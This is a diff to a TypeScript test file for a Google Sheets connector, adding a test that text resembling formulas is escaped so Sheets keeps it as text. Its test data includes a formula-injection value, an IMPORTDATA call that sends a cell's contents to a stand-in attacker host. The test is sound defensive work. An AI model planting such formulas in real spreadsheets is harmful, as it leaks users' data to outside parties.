@@ -9,6 +9,7 @@ import type {AddressInfo} from 'node:net';
 import {after, before, describe, it} from 'node:test';
 
 import {config} from '../src/config.js';
+import {sheetValues} from '../src/connectors/google-files.js';
 import {Catalog} from '../src/llm/catalog.js';
 
 import {expectStatus, fakeProvider, type FakeRequest, lastUserText, model, signup, startServer, type TestServer, waitFor} from './helpers.js';
@@ -315,6 +316,16 @@ describe('Google connections (Composio)', () => {
         assert.equal(first.value_input_option, 'USER_ENTERED');
         assert.deepEqual(first.values.slice(2), [['Item', 'Cost', 'Share'], ['Ads', '$1,200.00', '40%'], ['Swag', '$300.00', '10%'], ['Total', '=SUM(B4:B5)', '']]);
         assert.equal(second.range, '\'Owners\'!A1');
+    });
+
+    it('text that Sheets would run as a formula stays text', () => {
+        const values = sheetValues({name: 'S', columns: [{header: '=cmd'}, {header: 'Cost', type: 'currency'}], rows: [['=IMPORTDATA("https://evil.example/?x="&A1)', -5], ['@SUM(1)', 2]], totals: true}, 1);
+        assert.deepEqual(values.slice(2), [
+            ["'=cmd", 'Cost'],
+            [`'=IMPORTDATA("https://evil.example/?x="&A1)`, '-$5.00'],
+            ["'@SUM(1)", '$2.00'],
+            ['Total', '=SUM(B4:B5)'],
+        ]);
     });
 
     it('if Google says no, the Office file is still there', async () => {
